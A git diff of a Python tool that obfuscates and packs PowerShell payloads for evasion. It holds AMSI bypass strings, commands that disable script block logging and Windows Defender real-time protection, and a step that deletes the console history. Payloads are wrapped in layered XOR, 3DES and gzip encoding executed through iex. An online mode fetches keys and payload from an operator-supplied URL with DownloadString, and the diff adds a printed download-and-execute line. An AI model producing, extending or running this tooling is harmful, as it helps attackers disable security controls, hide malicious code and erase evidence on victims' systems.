@@ -22,19 +22,20 @@ O_DEBUG_PATH = './debug_obfu/'
 
 ender = """echo all i wanna see"""
 
-
-AVAILABLE_STRING_METHODS = []
-
 bypass = [
-    """[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)""",
-    """[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object "System.Collections.Generic.HashSet[string]"))""",
-    """$settings=[Ref].Assembly.GetType("Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)""",
+    """[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',40).SetValue($null,$true)""",
+    """[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures",40).SetValue($null, (New-Object "System.Collections.Generic.HashSet[string]"))""",
+    """$settings=[Ref].Assembly.GetType("Management.Automation.Utils").GetField("cachedGroupPolicySettings",40).GetValue($null)""",
     """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}""",
     """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")""",
-    """[ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))""",
+    """[ScriptBlock].GetField('signatures',40).SetValue($null,(New-Object Collections.Generic.HashSet[string]))""",
     """Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend""",
-    """write bypass done """,
     ]
+
+
+ending_actions = ';'.join([
+            ' rm -Force -ErrorAction Continue $env:APPDATA"\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" ',
+            ])
 
 
 def sizeof_fmt(num, suffix='B'):
@@ -44,16 +45,20 @@ def sizeof_fmt(num, suffix='B'):
         num /= 1024.0
     return "%.1f%s%s" % (num, 'Yi', suffix)
 
+
 def rand_case(s):
     if type(s) != str:
         s = s.decode('utf-8')
     return ''.join(x.lower() if round(random.random()) else x.upper() for x in s)
 
+
 def rand_char():
     return random.choice(string.ascii_letters)
 
+
 def rand_string(l=8):
     return ''.join(random.choice(string.ascii_letters+string.digits) for x in range(l))
+
 
 def get_cmdlets():
     log.info('Getting commandlets')
@@ -67,16 +72,19 @@ def get_cmdlets():
             ret = f.read()
     return list(filter(lambda x:x, ret.split('\n')))
 
+
 def remove_block_comments(s):
     if type(s) != str:
         s = s.decode('utf-8')
     return dwrite(s)
+
 
 def wrap_try(s):
     log.debug('Running Wrap Try')
     if type(s) != str:
         s = s.decode('utf-8')
     return 'try{{{0}}}catch{{write $_.Exception.Message}}'.format(s)
+
 
 def build_bypass(l=bypass):
     log.info('Building Bypass')
@@ -87,14 +95,18 @@ def build_bypass(l=bypass):
 
     return dbg + ';'.join(map(wrap_try,l))
 
+
 def fs_xor(s, k=None):
     log.info('Running Forward Single Char XOR Obfuscation')
+
     if type(s) != str:
         s = s.decode('utf-8')
+
     if not k:
         k = random.choice(list(string.ascii_letters+string.digits))
     s = ''.join([chr(ord(x) ^ ord(k)) for x in s ]).encode('utf-8')
     k = str(ord(k))
+
     if args.online:
         k = online_resource(k)
     else:
@@ -170,7 +182,6 @@ def gz(s):
     if type(s) != bytes:
         s = s.encode('utf-8')
     
-    
     pre_len = len(s)-1
     s = gzip.compress(s)
 
@@ -178,7 +189,6 @@ def gz(s):
     if O_DEBUG:
         dbg = 'echo "Starting gzip";'
 
-    
     return dwrite(rand_case(''';{1};$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{0}'));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);clear-variable g,i,x;iEx([Text.Encoding]::UTF8.'GetString'($o.ToArray()));clear-variable o;''').format(base64.b64encode(s).decode('utf-8'), dbg ))
     #return dwrite(rand_case('''$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{0}'));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$r="";for($u=0;$u -le {1}; $u++){{$r+=[Text.Encoding]::UTF8.GetString($g.readbyte())}};iEx($r);''').format(base64.b64encode(s).decode('utf-8'), pre_len )) # less mem but much more compute, maybe in a mem restricted env???
 
@@ -190,18 +200,35 @@ def remove_quotes(s):
     return s
 
 def string_obfu_method1(s):
-    ret = "({0})".format('+'.join([ f'[char]{ord(x)}' for x in remove_quotes(s)]))
-    return ret
+    return dwrite("({0})".format('+'.join([ f'[char]{ord(x)}' for x in remove_quotes(s)])))
 
 def string_obfu_method2(s):
-    ret = "({0}|%{{($_.length-as[char])}})-join''".format( ','.join([f"'{' '*ord(x)}'" for x in remove_quotes(s) ]))
-    return ret
+    return dwrite("({0}|%{{($_.length-as[char])}})-join''".format( ','.join([f"'{' '*ord(x)}'" for x in remove_quotes(s) ])))
 
-def rand_string_obfu(s,available_methods):
+def string_obfu_method3(s):
+    rand = list(set(s))
+    random.shuffle(rand)
+    rand = ''.join(rand)
+    st,fr = ([], list(["([char]{0})".format(ord(a)) for a in rand]))
+    list([st.append('{{{0}}}'.format(rand.find(x))) for x in s])
+    return dwrite("('{0}'-f{1})".format(''.join(st),','.join(fr)))
+
+def disabled_string_obfu_method4(s):
+    rand = list(set(s))
+    random.shuffle(rand)
+    rand = ''.join(rand)
+    st,fr = ([], list(rand))
+    list([st.append('{{{0}}}'.format(rand.find(x))) for x in s])
+    return dwrite("('{0}'-f'{1}')".format(''.join(st),"','".join(fr)).replace("'''","'\\'").replace("'\\'","'\\\\'"))
+
+
+def rand_string_obfu(s,available_methods=None):
+    if not available_methods:
+        available_methods = list(map(eval,filter(lambda x:x.startswith('string_obfu_method'), globals() )))
+    available_methods
     m = random.choice(available_methods)
     log.debug(f"{m.__name__} Chosen for string")
-    ret = m(s)
-    return ret
+    return m(s)
 
 
 def string_obfu(s):
@@ -211,14 +238,14 @@ def string_obfu(s):
     f_strings,m_strings,find = [],[],[]
     #print(s)
     find.extend(re.findall('(@".{10,}?"@)|(@\'.{10,}?\'@)',s,re.DOTALL+re.MULTILINE))
-    find.extend(re.findall('(".*?")|(\'.*?\')',s))
+    find.extend(re.findall('(".*?(?<!`)")|(\'.*?(?<!`)\')',s))
     #print('asd',find)
     if find:
         [[f_strings.append(a) for a in x if len(a)>4] for x in find]
         if f_strings:
             #print('dsa',f_strings)
             for st in f_strings:
-                n = rand_string_obfu(st, AVAILABLE_STRING_METHODS)
+                n = rand_string_obfu(st)
                 if '$' not in st and list(set(st)) != " ":
                     log.debug(f"obfu: {st} {n}")
                     s = s.replace(st,n,1)
@@ -254,8 +281,8 @@ def triple_des(s):
         key = online_resource(key)
         iv = online_resource(iv)
     else:
-        key = f'''"{base64.b64encode(key).decode('utf-8')}"'''
-        iv = f'''"{base64.b64encode(iv).decode('utf-8')}"'''
+        key = f'''"{key}"'''
+        iv = f'''"{iv}"'''
     
     dbg = ''
     if O_DEBUG:
@@ -279,7 +306,7 @@ def online_resource(s):
             f.close()
             log.info(f"Stored resource at: {fp}")
 
-    return f"((New-Object System.Net.WebClient).DownloadString('{'/'.join((args.url, os.path.join(wp,filename)))}'))"
+    return f"( {cmdlet_obfu('New-Object')} ({rand_string_obfu('System.Net.WebClient')})).({rand_string_obfu('DownloadString')})({rand_string_obfu('/'.join((args.url, os.path.join(wp,filename))))})"
         
 
 
@@ -308,13 +335,7 @@ def cmdlet_obfu(s):
         while c in s:
             n = c.strip().lower()
             log.info('Found: {0}'.format(c))
-            rand = list(set(n))
-            random.shuffle(rand)
-            rand = ''.join(rand)
-            st = []
-            fr = list(["([char]{0})".format(ord(a)) for a in rand])
-            list([st.append('{{{0}}}'.format(rand.find(x))) for x in n])
-            cmd = "'{0}'-f{1}".format(''.join(st),','.join(fr))
+            cmd = rand_string_obfu(n)
             log.debug(cmd)    
             #print(subprocess.check_output('''/usr/bin/pwsh -C "{0}"'''.format(cmd), shell=True).decode('utf-8').strip())
             cmd = ' &({0}) '.format(cmd)
@@ -327,18 +348,14 @@ def cmdlet_obfu(s):
 #print(get_cmdlets())
 
 
-AVAILABLE_STRING_METHODS = [
-    string_obfu_method1,
-    #string_obfu_method2,
-
-]
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
+    parser.add_argument('-O', '--output-path', help='Output file path', default=None)
     parser.add_argument('-do', '--debug-obfu', help='Enable Obfuscation Debugging', default=False, action="store_true")
     parser.add_argument('-dp', '--debug-obfu-path', help='Obfuscation Debugging Path', default="./debug_obfu/")
     parser.add_argument('-d', '--debug', help='Enable Debug Logging', default=False, action="store_true")
     parser.add_argument('-ng', '--no-gzip', help='No Inital GZIP', default=False, action="store_true")
+    parser.add_argument('-op', '--only-pack', help='No Inital obfuscation', default=False, action="store_true")
     parser.add_argument('-r', '--rounds', help='# of Obfuscation Rounds', type=int, default=3)
     parser.add_argument('-p', '--pad', help='Pad gzip with X bytes (new lines)', type=int, default=0)
     parser.add_argument('-o', '--online', help='Use online keys',default=False, action="store_true")
@@ -368,12 +385,15 @@ if __name__ == "__main__":
     
     c = []
     p = _file.read()
-    p = cmdlet_obfu(p)
+    if not args.only_pack:
+        p = string_obfu(cmdlet_obfu(p))
+    
+    
     b = string_obfu(build_bypass())
     #log.info(f"{b}")
     #print(b)
     #exit()
-    p = string_obfu(p)
+    
     #print(p)
     
     if not args.no_gzip:
@@ -383,16 +403,23 @@ if __name__ == "__main__":
     [(a:=random.choice(funcs), p:=(gz(a(p)),log.info(f"Size is now: {sizeof_fmt(sys.getsizeof(p))}"))[0], c.append( str(a.__name__) )) for _ in range(args.rounds)]
     
 
-    p = '{0};$x="";{1}; write done'.format(b,p)
+    p = '{0};$x="";{1};{2}'.format(b, p, ending_actions)
     
     if not args.no_gzip:
         
         
         p = gz(p)
     log.info(f"Final length: {sizeof_fmt(sys.getsizeof(p))}")
-    print(p)
+    if args.output_path:
+        with open(args.output_path,'w') as f:
+            f.write(p)
+            f.flush()
+    else:
+        print(p)
+
     log.info("Rounds ran:")
     for r in c:
         log.info(r)
+    log.info(f"You can use: iex({online_resource(p)})")
 
 
